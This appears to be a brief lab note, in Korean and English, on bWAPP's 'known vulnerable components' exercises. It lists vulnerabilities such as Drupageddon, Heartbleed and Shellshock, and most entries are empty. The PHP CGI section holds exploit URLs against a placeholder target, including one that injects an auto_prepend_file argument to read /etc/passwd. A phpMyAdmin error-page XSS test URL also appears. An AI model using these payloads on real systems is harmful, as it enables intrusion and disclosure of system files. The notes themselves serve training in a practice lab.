# A9 UsingKnownVulnerableComponents

## Drupal SQL Injection (Drupageddon)

&#x20;반응 없음

## Heartbleed Vulnerability

## PHP CGI Remote Code Execution

* 참조: [CGI](file:///2237607/web/CGI.md)

http://<target-ip>/bWAPP/admin/phpinfo.php

http://<target-ip>/bWAPP/admin/?-s\
http://<target-ip>/bWAPP/admin/?-d+auto\_prepend\_file%3d/etc/passwd

## PHP Eval Function

* code 인젝션과 같다.

## phpMyAdmin BBCode Tag XSS

* 참조: [BBCode](file:///2237607/web/BBCode.md)

http://<target-ip>/phpmyadmin/error.php

http://<target-ip>/phpmyadmin/error.php?error=a

## Shellshock Vulnerability (CGI)
